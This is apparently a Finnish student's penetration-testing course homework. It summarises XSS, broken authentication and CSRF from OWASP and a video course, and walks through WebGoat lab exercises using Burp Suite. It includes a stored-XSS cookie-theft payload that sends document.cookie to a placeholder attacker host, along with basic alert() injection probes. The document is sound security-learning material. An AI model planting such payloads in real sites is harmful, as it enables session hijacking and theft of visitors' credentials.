# x)

## Cross Site Scripting [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)

- Tapa injektoida javascriptiä webbisivulle
- XSS Reflected: Manipuloidaan URLia ja lähetetään URL kohteelle, ja uhrin klikatessa linkkiä Javascriptiä ajetaan tämän selaimessa.
    - Haavoittuvuutta voidaan testata esim. ajamalla missä tahansa sivun inputissa (chatit, searchit, messaget yms) scriptiä `<script>alert('toimiiko?')</script>`, ja mikäli sivulla on XSS haavoittuvuus, näytölle tulee alertti.
    - Samalla URL muokkautui ja se voidaan lähettää kenelle tahansa, ja klikkaamalla aukeaa sama alertti
- XSS Stored: URL manipuloinnin sijaan Javascriptiä talletetaan sivulle. Koodia ajetaan siis kohteen koneella aina, kun kuka tahansa menee sivustolle.
    - Inputeilla voi taas kokeilla `<script> jotain koodia </script>`
    - Javascript tallentuu sivustolle
- Joskus inputeissa maximikirjainmäärä voi rajoittaa koodin määrää. 
    - Voidaan mahdollisesti ohittaa -> Inspect, etsitään HTML elementeistä oikea inputti ja muokataan elementin max pituutta
- [BeEF](https://beefproject.com/) (Browser Exploitation Framework Project)
    - Ajamalla BeEFin javascriptiä webbisivulla, kaikki sivulla kävijät saadaan "koukkuun" BeEFiin ja näiden ip-osoitteet ja muuta tietoa
    - Koukussa oleviin koneihin voidaan nyt ajaa etänä komentoja, jotka suorittavat välittömästi kohteen päässä
- Javacriptin voi poistaa käytöstä selaimen asetuksissa. Tai blokata vain tietyille sivustoille

## [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)

### A2 Broken Authentication
- Hyökkääjillä käytössä valmiita käyttäjänimi, salasana, sanakirja-listoja, joita voidaan kokeilla kirjatutumiseen
- Ajetaan valmiita sanakirjalistoja yksinkertaisten salasanojen selvittämiseksi, esim Password1 tai vertaillaan heikkoja häshättyjä salasanoja, joissa on monta oikeaa vastausta.
- Voidaan poimia tärkeitä tietoja URLista, kuten vaikka session ID

### A3 Sensitive Data Exposure
- Tärkeän datan tulisi aina olla suojattua, cryptattua esim. SHA512. HTTPn vaarat -> ei suojattu yhteys
- Data viedään salattuna tietokantaan, mutta noutovaiheessa salaus puretaan automaattisesti, jolloin esim. SQL injektiolla voidaan saada tärkeitä tietoja, kuten luottokorttitiedot, selkokielisenä.

### A7 Cross Site Scripting
- Tarkoitus etäajaa koodia uhrin selaimessa.
- Automaattisia työkaluja, jotka tunnistaa kaikki 3 XSSn muotoa ja valmiita exploitteja
- Kahdessa kolmesta applikaatiosta löytyy XSS haavoittuvuuksia
    - PHP, J2EE / JSP, ASP.NET teknologioita sisältävistä löytyy erityisesti
- Nettisivun input kentän syötteet tulevat URLiin ja URLia voidaan muokata ajamaan jotakin javascript komentoa. Urlia jakamalla ja lopulta uhrin klikatessa sitä selain ajaa urliin upotetut javascript komennot, jotka voi aiheuttaa esimerkiksi session IDn menettämisen hyökkääjälle, joka voi kaapata käynnissä olevan session.

# z) Cross site story, esimerkki Stored XSS hyökkäyksestä
- Nettisivustolla on viestittely ominaisuus, jonka kautta sivun käyttäjät voivat jättää viestejä toisille sivustolla kävijöille, esimerkiksi jokin foorumi.
    - `<p>Hei, tässä on tämä viestini!</p>`
- Applikaatio ei prosessoi lähetettyjä viestejä muuten kuin printtaamalla ne sivustolle, joten hyökkääjä voi suoraan lähettää haitallisia viestejä muille käyttäjille. Hyökkääjä siis voi itse kirjoittaa foorumille vaikkapa alla olevan viestin:
    - `<p><script>document.location='http://www.hyökkääjä.com/cgi-bin/cookie.cgi?foo='+document.cookie</script></p>`
    - Tämän hyökkäyksen tarkoitus on lähettää uhrin session ID hyökkääjälle, jolla hyökkääjä voi varastaa istunnon oikeudet, esimerkiksi ylläpitäjältä
    - Kun uhri avaa foorumisivun missä hyökkääjän javascript on istutettu viestiin, se ajetaan uhrin selaimessa ja scripti lähettää tiedot hyökkääjän nettisivuille.
    - Hyökkääjä saa haltuunsa tietoja kaikilta sivulla kävijöiltä, kun riittävät käyttöoikeudet omaava henkilö käy sivulla, hyökkääjällä onkin sivuston käyttöoikeudet yks kaks hallussaan.

# a) [WebGoat](https://owasp.org/www-project-webgoat/)
## A2 Broken Authentication
### Authentication Bypasses
- Lähtökohtaisena tarkoituksena tehtävässä on muokata turvakysymyksen parametrejä siten, että ne voidaan ohittaa.
- 2FA Password Reset tehtävässä täytyi muokata form elementissä olevia inputteja. Muokkasin randomilla `secQuestion` arvoja, eli niiden numeroita vain isommaksi kuvan mukaisesti, eli `secQuestion0 -> secQuestion2`. Ja näin submitti meni läpi ja pääsin vaihtamaan salasanaa.

![2FA_Password_Reset](/images/2FA_Password_Reset.png)

![2FA_Password_Reset_result](/images/2FA_Password_Reset_result.png)

## A3 Sensitive Data Exposure
- Tarkoituksena tutustua siihen, miksi tärkeän datan tulisi olla kryptattua sitä lähettäessä
- Tehtävässä oli tarkoitus painaa Login nappia ja tutkia lähetettyä pyyntöä. 

![A3_login_form](/images/A3_login_form.png)

- Pyynnön näkee yksinkertaisimmillaan Firefoxin Network välilehdeltä valitsemalla lähetetty POST-pyyntö ja sen Request välilehdeltä. Näkymän username ja password kelpaavat oikeiksi vastauksiksi tehtävään.

![A3_Insecure_login](/images/A3_Insecure_login.png)

- Halusin tutkia lähetettyä pyyntöä myös jollain packet snifferillä ja googletuksen ensimmäinen tulos oli Kalissa valmiina löytyvä Burp Suite. Sen proxyn käytöstä löytyi yksinkertainen youtube video [Youtube, webpwnized](https://www.youtube.com/watch?v=7ePmWhypzBI). Ohjeita seuraamalla sain sekä Burp Suiten, että Firefoxin asetukset kohdilleen, mutta ongelmana oli vielä se, ettei Firefoxissä pystynytkään oletusasetuksilla keskeyttämään localhostissa pyörivän sivun pyyntöjä, vaikka se toimi kyllä muilla sivuilla jo.
    - Vastaus löytyi taas googlesta [portswigger](https://forum.portswigger.net/thread/burp-interception-does-not-work-for-localhost-in-chrome-a787f541) ja piti muokata Firefoxin asetuksia kirjoittamalla URL kenttään `about:config` ja sitten muuttaa asetuksen `network.proxy.allow_hijacking_localhost` arvo TRUE. Nyt toimii myös Burp Suitella localhostin interceptaus. 
- Asetusten settaamisen jälkeen voitiinkin palata WebGoattiin Log Inin äärelle ja varmistaa, että Burp Suitessa on `Intercept is ON` välilehdellä Proxy -> Intercept. Sitten vain Log Iniä klikkaamaan.
- Burp Suitessa nähdään joko suoraan Intercept välilehdellä kaapattu pyyntö, mutta paremmin kaapatut pyynnöt löytyvät välilehdeltä `HTTP History` ja sieltä POST pyyntö valitsemalla. 

![Burp_Suite_Result](/images/A3_Burp_suite_result.png)

## A7 Cross Site Scripting XSS
- Hyödynnetään käyttäjän luottamusta sivustoon.
- XSS tarkoitus on sivuston html elementtien ja javascript syötteiden väärinkäyttö erilaisten injektioiden aikaansaamiseksi ja tätä kautta tiedon, kuten keksin, hankintaa, tai väärien kenttien luomisen kautta esim. käyttäjätunnusten varastamista.
- Ensimmäisessä tehtävässä (What is XSS?) oli tarkoitus tarkastella eri tabien keksejä, ja tätä voitiin eri tabeissa ollessa tarkastella Consolessa lyömällä `alert(document.cookie)` ja lopputuloksena oli sama keksi jokaiselta tabilta.
- Yleisimpiä lokaatioita missä haavoittuvuutta voi hyödyntää:
    - Hakukentät, jotka toistavat hakumerkkijonon takaisin käyttäjälle
    - Syötekentät, jotka toistavat käyttätietoja
    - Virheilmoitukset, jotka palauttavat käyttäjän syötteitä
    - Piilotetut kentät, jotka sisältää käyttäjän toimittamia tietoja
    - Mikä tahansa sivu, joka näyttää käyttäjän toimittamia tietoja, esim viestitaulut, vapaat kommentit
    - HTTP headerit
- Toisessa tehtävässä (Try It! Reflected XSS) oli tarkoitus tutkia, mistä kentästä löytyy XSS haavoittuvuus. Se voidaan kokeilla ajamalla input kentissä esim. `alert()` tai `console.log()`. Ja jotta tämä toimii input kentässä se täytyy kietoa script tägien sisään, eli tässä tapauksessa haavoittuvuus löytyi access coden kentässä laittamalla siihen `<script>alert()</script>` ja saatiin vastaus sivulta `Seems like you tried to compromise our shop with an reflected XSS attack. We do our... "best"... to prevent such attacks. Try again!`. Muissa kentissä ei näyttänyt olevan haavoittuvuutta.

## A8:2013 Request Forgeries
### Cross-Site Request Forgeries
- Hyödynnetään sivuston luottamusta käyttäjään.
- Sivustojen välinen pyyntöväärennös, joka tunnetaan myös nimellä one-click attack tai session riding ja se lyhennetään joko CSRF tai XSRF (kutsutaan myös sea-surf). Kyseessä on haitallinen exploitti, jossa luvattomia komentoja lähetetään käyttäjältä, johon sivusto luottaa.
- Tehtävässä `Basic Get CSRF Exercise` piti triggeröidä Query ulkoisesta lähteestä ja mietin hetken mitä tässä pitää tehdä. Vinkeistä löytyi ulkoisen sivun tekeminen, joten pistin yksinkertaisella python scriptillä webbipalvelimen pystyyn.
    - Sivulle loin WebGoatista Inspectorista löytämäni formin hidden elementteineen ja painoin omalla luomallani sivullani Submit Querya vain saadakseni errorin.

    ![A8:2013_form](/images/A8_2013_form.png)

    ![A8:2013_error](/images/A8_2013_error.png)

    - Palasin tutkimaan WebGoatin form elementtiä edistymättä asiassa suuntaan enkä toiseen ja jouduin lopulta turvautumaan googleen [Walkthrough](https://github-wiki-see.page/m/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)#a8-2013-request-forgery) vain huomatakseni, että action kohdasta puuttui ohjaus localhostiin :)))

    ![A8:2013_correct](/images/A8_2013_correct.png)

    - Ja nyt klikkaamalla submittia löytyy flägi

    ![A8:2013_flag](/images/A8_2013_flag.png) 

- Seuraavassa (Post a review on someone else’s behalf) täytyi postata kirjautuneen henkilön puolesta jotakin sivulle.
- Lähdin samalla periaatteella liikkeelle luomalla omalle sivulleni WebGoatista kopioidun formin ja muokkaamalla actionin osoitetta ja kirjaamalla sivulle muodostuneeseen inputtiin tekstiä ja lähettämällä sen, sain tehtävän tehtyä

![A8:2013_4_result](/images/A8_2013_4_result.png)


# b) [ATT&CK](https://attack.mitre.org/)
## [Credential Access / Brute Force](https://attack.mitre.org/techniques/T1110/)
- Hydra
- John The Ripper

## [Discovery / File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
- [Goofile](https://www.kali.org/tools/goofile/)


# e) Vulnhub [The Planets: Earth](https://www.vulnhub.com/entry/the-planets-earth,755/) 
- Tästä toisaalla

### Lähteet
- [Kurssisivu, Tero Karvinen](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack)
- [ATT&CK](https://attack.mitre.org/)
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)
- [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)
- [BeEF](https://beefproject.com/)

